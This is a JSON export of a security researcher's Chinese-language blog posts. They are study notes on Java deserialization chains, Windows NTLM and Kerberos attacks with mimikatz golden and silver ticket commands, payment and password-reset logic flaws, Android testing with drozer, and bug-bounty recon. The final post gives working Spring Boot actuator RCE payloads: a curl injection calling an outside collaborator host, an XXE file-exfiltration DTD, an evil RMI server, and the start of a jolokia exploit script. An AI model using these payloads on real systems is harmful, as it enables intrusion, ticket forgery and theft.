{"meta":{"title":"Halfblue","subtitle":null,"description":null,"author":"halfblue","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"CommonsCollections反序列化链整理","slug":"CommonsCollections反序列化链整理","date":"2021-08-23T15:53:21.000Z","updated":"2021-09-26T16:03:02.086Z","comments":true,"path":"2021/08/23/CommonsCollections反序列化链整理/","link":"","permalink":"http://yoursite.com/2021/08/23/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%95%B4%E7%90%86/","excerpt":"整理下cc链，开局先上图","text":"整理下cc链，开局先上图可以看出其实这么多条链都只是排列组合，基本没有非用哪条链不可的情况。这8条链里面，到执行点sink前有6条路径到使用ChainedTransformer.transform，一条路径到TransformingComparator.compare，共7种。而执行点中有3种执行方法，所以只从已有链出发就能推出21条链。还可以添加新的元素，比如使用DefaultedMap代替LazyMap，或者添加URLClassLoader.loadClass作为执行点，都可以创造所谓的新的链条，但意义不大。","categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://yoursite.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"彻底理解windows认证","slug":"彻底理解windows认证","date":"2020-07-21T15:44:58.000Z","updated":"2020-08-12T15:50:54.000Z","comments":true,"path":"2020/07/21/彻底理解windows认证/","link":"","permalink":"http://yoursite.com/2020/07/21/%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3windows%E8%AE%A4%E8%AF%81/","excerpt":"这是篇windows域相关的知识的学习笔记，来自倾旋大佬。标题也是我从他那偷的。","text":"这是篇windows域相关的知识的学习笔记，来自倾旋大佬。标题也是我从他那偷的。1、windows本地认证就是自己的本地计算机登录过程。密码在C:\\Windwos\\System32\\config\\SAM里，登录时会进行比对。密码的存储形式是NTLM哈希，32位数字字母。流程是hex-&gt;unicode-&gt;md4 123admin -&gt; hex(16进制编码) = 61646d696e61646d696e -&gt; Unicode = 610064006d0069006e00610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634 winlogon进程接受账号密码，传给lsass进程计算哈希。以前用的是LM hash，流程如下： 1234567将密码转为大写转16进制补齐为14字节并切分成两个七字节转为二进制左边补0补齐56bit7比特一组，分成8组，末尾加0每组比特流转换为16进制作为key，对固定字符串KGS!@#$%进行des加密(这里倾旋大佬讲错了，把这个当成了key)，将结果拼接。 如果破解的话，破解过程实际是爆破des加密的密钥，因为des密钥限制在56bit，所以长度限制在了七位。还有个特点是如果密码长度不超过七位，后半段哈希是固定的AA-D3-B4-35-B5-14-04-EE对比下来其实都是爆破，只是lm hash不区分大小写，最长14位，可以对两个七位分开爆破，爆破的难度小点。2、windows网络认证局域网内能互相通信的机器默认在一个工作组下，点对点认证，可以传输文件等。工作组是逻辑概念，不同子网主机只要能通信就在一个工作组。主要研究smb认证。smb最开始是明文传输口令，后来用LM(LAN Manager Challenge/Response)协议，再后来是NTLM协议和Kerberos协议1)挑战/响应模式LM协议和NTLM协议都采用这一模式协议分三步：协商：主要用于确认双方协议版本质询：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴。验证：验证主要是在质询完成后，验证结果，是认证的最后一步。质询过程(LM/NTLMv1协议)：1.客户端向服务器端发送用户信息(用户名)请求2.服务器接受到请求，生成一个随机字符，称为”Challenge”， 使用登录用户名对应的LM/NTLM Hash作为密钥加密(简单变形后进行DES加密)Challenge， 生成Challenge1(在网络协议中称之为Net NTLM Hash)。同时，生成Challenge1后，将Challenge发送给客户端。3.客户端接受到Challenge后，使用将要登录到账户对应的LM/NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。其实就是在同一加密规则下，不泄露Hash明文的条件下比较NTLM Hash是否相同。 NTLM协议分为v1和v2两种，区别在于NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。以及加密challenge的过程，v1是简单变形后进行DES加密，v2是HMAC-MD5。对于LM和NTLMv1协议，如果伪造一个server端，可以获取到Net NTLM Hash，这也是responder的原理。固定challange之后查彩虹表爆破des密钥就行了。Net-NTLM v2就没啥好办法了，爆破看字典和命了。 2)哈希传递(pass the hash/pth)功能：使用NTLM Hash在不需要账号密码的情况下完成认证从上面的质询过程中可以看出，认证过程全程是不需要密码明文的，只需要用户名和用户的NTLM Hash。所以可以利用服务器给的challenge自己计算个response通过服务器的认证，这个技巧就是哈希传递。很多工具都有这功能，Smbmap、CrackMapExec、Smbexec、Metasploit等等。3、域环境1)活动目录(active directory)活动目录存储了有关网络对象的信息，安装在域控上，对整个域进行管理，管理对象包括计算机、用户、资源、桌面等。活动目录也就是域服务。2)Kerberos认证协议Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。也就是说Kerberos可以抵抗中间人攻击。Kerberos的含义是三头犬，代表client、server、KDC(Key Distribution Center)认证中的凭证有两种：TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证。不对应具体服务。票据（Ticket）：是网络对象互相访问的凭证。对应具体服务。大概就像吃自助，TGT是入场券，Ticket是某道菜的券(奇妙比喻)。所以明显TGT更值钱。域控中和认证有关的有两部分第一是AD(account database)，它存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。第二是KDC，分为两个服务AS(Authentication Service): 为client生成TGTTGS(Ticket Granting Service): 为client生成某个服务的ticket域认证粗略流程：Ⅰ client向KDC请求，希望获取TGT以访问某个server(这一步并没有指定server信息)。 KDC首先需要判断client是否是可信赖的， AS服务通过在AD中查询来判断client是否合法。查询合法后，AS返回TGT给client。Ⅱ client得到了TGT后，带着TGT继续向KDC请求，希望获取访问指定server的权限。这个过程由TGS服务处理，TGS通过client 消息中的TGT，判断出了client拥有权限，给了client访问对应server的权限ticket。Ⅲ client得到ticket后，就可以成功访问server。这个ticket只是针对这个server，访问其他server需要再向TGS申请。从上述过程中可以看出，TGT是不对应具体server的，ticket对应具体的server。也就是说如果可以伪造TGT就可以申请任意server的ticket，登录任意server。 这个流程很粗略，缺少细节，接下来写下域认证的具体过程。为了简便，过程中很多重复出现的词我用了自己定义的符号缩写：Ⅰ client申请TGT(Authentication Service Exchange)：client向KDC的AS发送Authentication Service Request(KRB_AS_REQ)。KRB_AS_REQ的包含以下的内容：Pre-authentication data，用来证明自己是自己声明的client，实现是用户名对应的NTLM Hash(记作Kc)加密的时间戳，这里记作Kc(timestamp)client的name，记作cserver name，这个server并不是client要访问的server，因为TGT生成过程和server是无关的。这里是KDC的TGS的Server Name。记作Sclient发送KRB_AS_REQ({c,S,Kc(timestamp)})给KDC，KDC在AD查找用户c对应NTLM Hash的Kc，获取Kc后对Pre-authentication data进行解密，验证时间戳。验证通过后KDC会生成一个随机字符串Session Key(记作Ks)，但KDC并不会存储这个Ks，也就是说后续过程KDC无法验证Ks的来源(这就是后面黄金票据的原理)。之后KDC返还KRB_AS_REP给client，KRB_AS_REP包含以下内容：使用Kc对Ks加密得到的Kc(Ks)。TGT，TGT是使用krbtgt用户的NTLM Hash(记作Kkdc)加密的，形式是Kkdc{Ks，c，endTime(TGT的到期时间)}。Kc(Ks)和TGT会作为KRB_AS_REP一起返还给client。 Ⅱ 客户端申请指定server的ticket(TGS（Ticket Granting Service）Exchange)client拥有Kc，所以可以从Kc(Ks)解密获得Ks(Session key)。现在client有了Ks和TGT，向KDC中的TGS(Ticket Granting Service)发送Ticket Granting Service Request(KRB_TGS_REQ)。KRB_TGS_REQ大体包含以下的内容：TGT，TGT是Kkdc加密的，只有KDC能解密，用来验证client这一步申请的合法性。Authenticator，形式是Ks{c,s,timestamp}client的name，记作cserver的name，这次是指定要访问的那个server了，记作s获取到KRB_TGS_REQ({TGT,Ks{c,s,timestamp},c,s})后，TGS需要验证client提供的那个TGT是否是AS颁发给它的，也就是验证client提供的Authenticator。注意Authenticator使用了Ks进行加密，但KDC是没有办法直接解密的，因为KDC并没有存储Ks。所以KDC需要先使用Kkdc解密TGT获取其中的Ks，然后比对TGT中的c和该请求的c是否一致。验证通过后KDC会生成一个新的Session Key，叫做Server Session Key(记作Ks2)。之后会发送KRB_TGS_REP给client，内容如下：使用Ks对Ks2加密得到的Ks(Ks2)Ticket，Ticket是使用server的NTLM Hash(记作Kserver)加密的。形式是Kserver{Ks2，c，endTime(Ticket的到期时间)}。可以看到其实Ticket和TGT形式是一样的，只是加密密钥变了。KRB_AS_REP({Kc(Ks),TGT})和KRB_TGS_REP({Ks(Ks2),Ticket})形式也是一样的。至此client和KDC的通信过程结束，下面client直接和server通信。 Ⅲ 利用Ticket登录server(CS（Client/Server ）Exchange)客户端利用Ks解密获得Ks2，向server发送Application Service Request(KRB_AP_REQ)，KRB_AP_REQ包含以下内容：Authenticator，形式是Ks2{c,timestamp}Ticket，形式是Kserver{Ks2，c，endTime}server使用自己的Kserver解密Ticket，获得Ks2。利用Ks2解密Authenticator中的c和ticket中的c是否一致，以及时间戳是否合法。校验通过后，认证成功，该票据会一直存在客户端内存中。总的来说就是使用对称加密，验证密钥、时间戳和身份来确保合法性。(终于写完了，想起来大三的时候学这段听天书的感觉了，爷青回。) 接下来说说大家常说的白银票据和黄金票据白银票据(Silver Tickets)的特点如下:1.不需要与KDC进行交互2.需要目标服务的NTLM Hash在第三步认证中的Ticket的组成为Ticket=Kserver{Ks2，c，endTime}，所以当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。因为server是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。用mimikatz伪造白银票据 1234首先需要导出Server Hash：C:\\files&gt;mimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt伪造票据:mimikatz &quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit 白银票据只能针对服务器上的某些服务去伪造，如WMI、Powershell、smb等等。黄金票据(Golden Tickets)特点如下:1.需要与KDC通信2.需要krbtgt用户的hash得到krbtgt用户的hash也就是前面的Kkdc之后，就可以伪造TGT。因为前面写了TGT=Kkdc{Ks，c，endTime}，而KDC并没有存储Ks，所以这个Ks可以任意写，只要拥有Kkdc就可以伪造合法的TGT。伪造好TGT就可以向KDC申请任意server的Ticket，实现对整个域的持久控制。黄金票据虽然叫Ticket，但其实是TGT，并不是Ticket。使用mimikatz生成黄金票据 1mimikatz &quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit 可以看出有了TGT就相当于有了某个用户的权限，所以还有种和哈希传递类似的攻击，叫做票据传递(Pass The Ticket)。原理是用户登陆到计算机时，Kerberos TGT本地存储在计算机上。在计算机上具有管理员权限的攻击者能够提取所有的TGT，并使用它在网络中不同的计算机之间横向移动。对服务来说这个叫非约束委派。 4、Windows Access Token 简介Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝。Access Token分为主令牌和模拟令牌用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。所以窃取令牌可以获得登陆过已注销的用户的权限。可以使用多种工具查看目前系统上存在的模拟令牌:IncognitoPowershell - Invoke-TokenManipulation.ps1Cobalt Strike - steal_token比如用meterpreter集成的incognito 123meterpreter &gt; getsystemmeterpreter &gt; load incognito meterpreter &gt; list_tokens –umeterpreter &gt; impersonate_token &quot;PAYLOADS\\\\Administrator” 就可以获得域管权限。 看了网上很多相关的文章，看着是中国字说的不是中国话，原理可能不太难，但是看名字真不知道是什么。整理了一下这些概念，算是入了个门。 参考链接https://payloads.online/archivers/2018-11-30/1https://xz.aliyun.com/t/2445https://www.anquanke.com/post/id/194069https://blog.csdn.net/wulantian/article/details/42418231","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"逻辑漏洞部分实例总结","slug":"逻辑漏洞部分实例总结","date":"2020-07-15T08:44:44.000Z","updated":"2020-08-12T15:47:52.000Z","comments":true,"path":"2020/07/15/逻辑漏洞部分实例总结/","link":"","permalink":"http://yoursite.com/2020/07/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%83%A8%E5%88%86%E5%AE%9E%E4%BE%8B%E6%80%BB%E7%BB%93/","excerpt":"平时接触的一大半都是逻辑漏洞，很多时候其实也不算漏洞，只是功能设计有缺陷，更多的是需要改变思路，想出利用场景，改个数据包轻松高危。","text":"平时接触的一大半都是逻辑漏洞，很多时候其实也不算漏洞，只是功能设计有缺陷，更多的是需要改变思路，想出利用场景，改个数据包轻松高危。 越权类修改id越权1、在关注、点赞、评分等功能如果出现userid，可以通过遍历userid刷量。2、修改uid越权查看个人信息、订单记录、聊天记录等等。3、如果没有id字段，可以尝试添加一个user_id之类的字段，这个字段可能是其他接口有，这个接口前端没写，但实际也是可以用的。4、也可以尝试修改内容id新建或删除评论、视频等。 权限绕过密码重置1、验证码暴力破解一般是在手机号后加特殊字符绕过次数限制，比如前面加0，后面加空格或者其他字符，可以fuzz参考https://wooyun.x10sec.org/static/bugs/wooyun-2012-011720.html2、重置token可猜测有案例用的是时间戳还有可能重置链接的key是手机号+验证码的md53、越权可能会有accountid/userid之类的参数，尝试修改。有些没有校验签名，校验签名的话逻辑也在js里，可以自己调一下。一般就是参数加个字符串哈希一下。可能前面校验手机号验证码返回token了，后一步的userid参数却没校验，可以修改最后一步的参数重置密码。参考https://wooyun.x10sec.org/static/bugs/wooyun-2013-018263.html4、修改返回值前端验证，修改返回包里的邮箱/手机号/id进入下一步。抓包时请求和返回包都要看，也可能在cookie里。5、改参数键可以尝试加或者删参数，比如把验证问题删掉，或者加个userid参数尝试修改其他id，也可以多写一个id参数，类似参数污染。6、session覆盖感觉挺少见的，参考https://wooyun.x10sec.org/static/bugs/wooyun-2014-085843.html 微博oauth1、正常登录后修改返回包中的uid2、获取access_token后登录其他app，同时修改access_token和uid 付费绕过 好友验证绕过 支付相关充值1、观察是否有productid之类的参数，尝试修改为价格更低的产品。2、观察是否有amount之类的参数，修改为小数字或负数。3、创建低价订单，替换订单id4、充非常大的数或者买非常多数量的产品(1073741824/2147483647)，可能整数溢出(高危)，也可能截到一个相对小一些的数(低危或忽略)。 签约首月优惠、会员升级、优惠券等。1、二维码如果可以同时用微信或支付宝扫，就各扫一次再分别支付，可能开通两个月。2、用没钱的卡支付，创建多个优惠订单再支付获取多次优惠。3、用两个手机，都停在支付页面，先开通一个后取消自动付费再用另一个开通。 优惠券1、并发领多张2、修改id领以前的优惠券 其他并发1、并发领奖励2、并发提现3、并发支付4、并发送礼物5、并发刷赞 短信轰炸(横向、纵向)删cookie、加空格、加0 改图片长宽导致dos 细心看每个数据包就行了，挺有意思的，也没啥意思。 参考链接http://www.kb-iot.com/post/1249.html","categories":[],"tags":[{"name":"挖洞","slug":"挖洞","permalink":"http://yoursite.com/tags/%E6%8C%96%E6%B4%9E/"}]},{"title":"安卓安全新手村攻略","slug":"安卓安全新手村攻略","date":"2020-07-02T13:26:45.000Z","updated":"2020-07-10T13:00:54.000Z","comments":true,"path":"2020/07/02/安卓安全新手村攻略/","link":"","permalink":"http://yoursite.com/2020/07/02/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%E6%96%B0%E6%89%8B%E6%9D%91%E6%94%BB%E7%95%A5/","excerpt":"最近要测一些app，除了直接测web端也有覆盖移动端常见的漏洞，学学常见的安卓漏洞和drozer的用法。","text":"最近要测一些app，除了直接测web端也有覆盖移动端常见的漏洞，学学常见的安卓漏洞和drozer的用法。不懂安卓开发，所以只总结些不涉及代码的漏洞。把apk改成zip解压，查看配置文件。查看AndroidManifest.xml，了解apk结构。 123456查看permission信息,比如读写权限、网络权限等等。cat AndroidManifest.xml | grep permission查看是否允许debugcat AndroidManifest.xml | grep debug查看暴露的服务cat AndroidManifest.xml | grep exported 查看assets和res/raw/中是否有敏感信息。然后连接手机开始调试，手机打开调试模式。安装adb和drozer，教程很多。 123456789连接drozeradb forward tcp:31415 tcp:31415drozer.bat console connect获取所有app名称adbadb shell pm list packages -f namedrozerrun app.package.list -f appnamerun app.package.list -a packagename 简单的信息泄露漏洞：通过adb logcat查看本地记录，是否有明文银行卡身份证号等被记录。安卓应用有四大组件：content providers、activities、broadcast providers、sservices。activities可能有绕过的风险，比如登录界面被绕过。通过drozer测试：run app.package.attacksurface target列出所有攻击面。查看activity信息 run app.activity.info -a target权限是null的话尝试直接调用activitiy，也许有未授权访问run app.activity.start –component 应用全称 Activity名称直接调用对应的activity。还可能存在拒绝服务漏洞adb shell am start -n target/activityapp退出运行即存在漏洞测试sql注入run app.provider.finduri targetrun app.provider.query urirun scanner.provider.injection -a target","categories":[],"tags":[{"name":"挖洞","slug":"挖洞","permalink":"http://yoursite.com/tags/%E6%8C%96%E6%B4%9E/"}]},{"title":"挖洞教科书The-Bug-Hunter's-Methodology-v4.0记录","slug":"挖洞教科书The-Bug-Hunter-s-Methodology-v4-0记录","date":"2020-06-25T09:58:14.000Z","updated":"2020-08-12T15:49:22.000Z","comments":true,"path":"2020/06/25/挖洞教科书The-Bug-Hunter-s-Methodology-v4-0记录/","link":"","permalink":"http://yoursite.com/2020/06/25/%E6%8C%96%E6%B4%9E%E6%95%99%E7%A7%91%E4%B9%A6The-Bug-Hunter-s-Methodology-v4-0%E8%AE%B0%E5%BD%95/","excerpt":"jason haddix的经典教程又更新了，翻译记录下。正好最近要刷刷src。","text":"jason haddix的经典教程又更新了，翻译记录下。正好最近要刷刷src。首先作者把挖洞分成两部分：信息收集和应用分析。这个演讲是关于信息收集的。第一点是记录项目，把挖过的项目都进行整理和更新，作者用xmind这个工具。用excel或者notebook也一样，主要是记录自己的工作内容。以xmind为例，作者在左侧记录资产信息、whois信息等，右侧记录不同的域名。打开右侧的端点，一个端点对应一个域名，作者记录了该域名一些功能点，潜在的漏洞以及对应的检测方法，这样能对目标进行比较全面的梳理。比如内容发现一栏对应js分析和目录爆破。动态输入对应文件上传和可疑api。介绍完记录工具，开始介绍正式内容。 信息收集广泛的信息收集包括很多内容，如图。包括目标域、asn、whois、子域名、资产、端口等等。 收集根域名首先需要确认目标域，也就是所谓的seeds/root。一般在src都会说明接受的域名范围。但有些src会接受所有公司的资产，有一些是没有列举出来的。以tesla为例，在https://www.crunchbase.com/textsearch?q=tesla进行搜索，可以搜索到公司拥有的资产，可能有一些src没有写出但也属于目标资产的域名，这样就可以扩大目标范围。资产收集的另一个技巧是asn(autonomous system numbers)，在https://bgp.he.net/可以查询目标机构的asn和ip等信息，用以确认资产是否属于目标。另外还可以用专门的工具，metabigor(https://github.com/j3ssie/metabigor)和asnlookup(https://github.com/yassineaboukir/Asnlookup)。ip反查asn还有个国内的工具https://tools.ipip.net/as.phpasn还可以用来发现根域名，使用amass(https://github.com/OWASP/Amass)可以通过asn获取根域名： 1amass intel -asn 46489 下一个技巧是whois查询，有很多在线工具，作者使用的是whoxy.com。通过查询whois发现目标机构过去的域名，可以扩大目标范围，但也有可能会有很多过期的域名。也有人写好了工具，domlink(https://github.com/vysecurity/DomLink)下一个技巧是利用ad/analytics tracker code，可以在builtwith.com查询，在relationship profile一栏里可以找到使用相同code的域名，扩大目标范围。下一个技巧是google，除了常规的搜索，可以搜索目标的版权、隐私之类的关键词，比如”© 2019 Twitch Interactive, Inc.” inurl:twitch然后就是shodan，比较常规，直接搜域名就行。 收集子域名收集子域名主要分三部分：链接、js泄露，枚举，爆破。作者使用burp收集链接中的域名：关闭被动扫描，设置自动提交表单，设置target关键词(不是完整域名)，访问网站并爬取所有域名。设置target过程如图： 这样不仅可以获取子域名，也可能获取到新的根域名，比如以twitch为关键字获取到twitchapp.net。之后在target一栏全选，右键engagement tools里面的analyze target保存即可。这个过程也可以用自动化爬虫然后再正则提取，爬虫的话有Gospider(https://github.com/jaeles-project/gospider)和hakrawler(https://github.com/hakluke/hakrawler)还有从js获取子域名的工具，比如subdomainizer(https://github.com/nsonaniya2010/SubDomainizer)和subscraper(https://github.com/Cillian-Collins/subscraper)，国内大家可能用过jsfinder，差不多。下一个环节是子域名枚举，有很多渠道可以进行子域名枚举，包括基础资源(censys、dnsdb)、搜索引擎、证书、安全资源。这个过程中可以使用的工具有amass、subfinder(https://github.com/projectdiscovery/subfinder)。amass是作者最常用的工具，它有很多功能，比如枚举子域名时还会返回asn，这样就有可能再添加新的asn，扩大目标范围。另一个工具是github search(https://github.com/gwen001/github-search)，它利用github进行搜索，其中一个功能是搜索子域名。类似的还有shosubgo(https://github.com/incogbyte/shosubgo)，它从shodan收集子域名。一个高手都在用的技术是通过aws、gcp、azure等云服务的证书搜索寻找子域名，大概原理是遍历并匹配。但是有一些经验文章，比如https://www.daehee.com/scan-aws-ip-ssl-certificates/、https://www.youtube.com/watch?v=1pqCqz3JzXE。这里给出一个工具 1curl &#x27;https://tls.bufferover.run/dns?q=twitch.tv&#x27; 2&gt;/dev/null |jq .Results 下一个环节就是大家熟悉的子域名爆破了，作者一样使用了amass，可以自己定义dns服务器和字典。 12amass enum -brute -d twitch.tv -srcamass enum -brute -d twitch.tv -rf resolvers.txt -w bruteforce.list 其实有很多类似的工具，比如国内jiejie的和seay的子域名爆破工具，作者还提供了shuffledns(https://github.com/projectdiscovery/shuffledns)爆破的结果其实取决于字典，作者使用的字典是把过去七年所有见过的子域名收集起来组成的，有15m。当然大字典会很慢，定制字典更有效率一些。Nahamsec也有一个关于字典的pre：https://www.youtube.com/watch?v=W4_QCSIujQ4作者也给出了一个现成的字典https://github.com/assetnote/commonspeak2获取到一些子域名后，可以寻找子域名命名的规律，利用altdns(https://github.com/infosec-au/altdns)可以发现一些没有爆破出来的符合命名规律的子域名。比如 12origin-sub.target.comorigin.sub.target.com 这两个可能解析的是同一个网站，但有可能一个有waf一个没有，也是种绕过waf的手段。最后就是端口扫描，可以先用masscan扫描打开的端口然后再用nmap确认具体端口信息，相比直接用nmap扫会快不少。因为masscan只接受ip作为参数，可以用dnmasscan(https://github.com/rastating/dnmasscan)自动把域名转换为ip再调用masscan。作者还给了个masscan的教程https://danielmiessler.com/study/masscan/在masscan和nmap扫描得到结果之后，可以利用brutespray(https://github.com/x90skysn3k/brutespray)对ftp/ssh/mysql等认证服务进行弱口令爆破子域名扫描的时候可以去github查找是否有信息泄露，也是利用前面说的github-search这个工具。Bugcrowd University有个教程：https://www.youtube.com/watch?v=l0YsEk_59fQ因为已经有了非常多子域名，下一步可以用眼睛来看。比起一个一个点，用工具自动截图更方便。作者给出了几个工具，包括aquatone、HTTPscreenshot、eyewitness。作者用最后一个，但其实都差不多。不过这只是可选项，作者大部分时候也是一个一个点开，因为可能会有跳转之类的问题。接下来要检测的是子域名接管，这是有域名就能测试的一个漏洞并且是个高危漏洞。原理在https://github.com/EdOverflow/can-i-take-over-xyz作者给了两个子域名接管的工具，https://github.com/Ice3man543/SubOver和https://github.com/projectdiscovery/nuclei最后就是框架部分。作者把信息收集框架分为几类。C类是简单的脚本，调用其他现有的工具。B类是自己写的模块，有图形界面或工作流。A类是自写模块，有图形界面，使用数据库迭代更新。S类就是再加上写自动提醒、机器学习之类的技术。作者给出了一些例子(oneforall瞩目) 不过S类的基本都是付费并且只面向公司的，据说intrigue.io核心部分是开源的。总的来说都是些信息收集的姿势，有一些还算比较新颖，并且也给出了许多工具，可以试着更新下自己的工具集。下一篇具体挖洞的还要过阵子才有。","categories":[],"tags":[{"name":"挖洞","slug":"挖洞","permalink":"http://yoursite.com/tags/%E6%8C%96%E6%B4%9E/"}]},{"title":"springboot下rce的多种姿势","slug":"springboot下rce的多种姿势","date":"2020-06-03T13:01:47.000Z","updated":"2020-06-08T14:25:32.000Z","comments":true,"path":"2020/06/03/springboot下rce的多种姿势/","link":"","permalink":"http://yoursite.com/2020/06/03/springboot%E4%B8%8Brce%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF/","excerpt":"springboot actuator除了信息泄露，更大的危害是可能导致rce，记录一下。","text":"springboot actuator除了信息泄露，更大的危害是可能导致rce，记录一下。首先查看是否有env路由，不一定在根目录下，可能在二级目录下。找到后查看是否允许post请求，能的话可以尝试rce，有几种方法。 springboot2第一种是最新的，需要springboot2，开启restart路由。流程很简单，首先修改spring.datasource.hikari.connection-test-query，创建一个新的数据库连接时这个变量的值就会执行，修改它为命令执行的代码 1curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\\&quot;name\\&quot;:\\&quot;spring.datasource.hikari.connection-test-query\\&quot;,\\&quot;value\\&quot;:\\&quot;CREATE ALIAS EXEC AS CONCAT(\\&#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\\&#x27;,\\&#x27; java.util.Scanner(Runtime.getRun\\&#x27;,\\&#x27;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\\&#x27;);CALL EXEC(\\&#x27;curl http://x.burpcollaborator.net\\&#x27;);\\&quot;&#125;&#x27; &#x27;http://localhost:8080/actuator/env&#x27; 然后重启应用 1curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; &#x27;http://localhost:8080/actuator/restart&#x27; 我这里用作者给的docker实验，不知道为什么用burp的collaborator收不到请求，用vps开了个端口收到了。但是命令执行后程序就会退出，不知道是特例还是共性。后几种都是springboot1下的。 jolokia1第一种是利用jolokia。首先访问jolokia/list，查看是否存在reloadByURL，有的话就可以利用。漏洞环境https://github.com/veracode-research/actuator-testbed首先可以xxe 12345678&lt;!--logback.xml--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:9999/file.dtd&quot;&gt;%remote;%int;]&gt;&lt;a&gt;&amp;trick;&lt;/a&gt;&lt;!--file.dtd--&gt;&lt;!ENTITY % d SYSTEM &quot;file:///C:/wamp/1.txt&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;http://127.0.0.1:9999/%d;&#x27;&gt;&quot;&gt; 访问http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:9999!/logback.xml即可完成攻击然后还可以实现rce，利用的是JNDI注入。修改logback.xml 123&lt;configuration&gt; &lt;insertFromJNDI env-entry-name=&quot;rmi://127.0.0.1:1097/jndi&quot; as=&quot;appName&quot; /&gt;&lt;/configuration&gt; 修改rmiserver，代码来自https://github.com/mpgn/Spring-Boot-Actuator-Exploit 12345678910111213141516171819202122import java.rmi.registry.*;import com.sun.jndi.rmi.registry.*;import javax.naming.*;import org.apache.naming.ResourceRef; public class EvilRMIServer &#123; public static void main(String[] args) throws Exception &#123; System.out.println(&quot;Creating evil RMI registry on port 1097&quot;); Registry registry = LocateRegistry.createRegistry(1097); //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null); //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;)); //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,&#x27;calc.exe&#x27;]).start()\\&quot;)&quot;)); ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref); registry.bind(&quot;jndi&quot;, referenceWrapper); &#125;&#125; 启动rmi服务 1java -Djava.rmi.server.hostname=127.0.0.1 -jar RMIServer-0.1.0.jar 还是访问同一个链接，执行命令。 jolokia2jolokia还有一种jndi注入rce的方法，查看/jolokia/list中org.apache.catalina.mbeans.MBeanFactory是否存在。直接python打，还是自己起一个rmiserver 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#-*-coding:utf8-*-import requests as reqimport sysfrom pprint import pprinturl = sys.argv[1] + &quot;/jolokia/&quot;pprint(url)#创建JNDIRealmcreate_JNDIrealm = &#123; &quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;operation&quot;: &quot;createJNDIRealm&quot;, &quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]&#125;#写入contextFactoryset_contextFactory = &#123; &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;, &quot;type&quot;: &quot;WRITE&quot;, &quot;attribute&quot;: &quot;contextFactory&quot;, &quot;value&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;&#125;#写入connectionURL为自己公网RMI service地址set_connectionURL = &#123; &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;, &quot;type&quot;: &quot;WRITE&quot;, 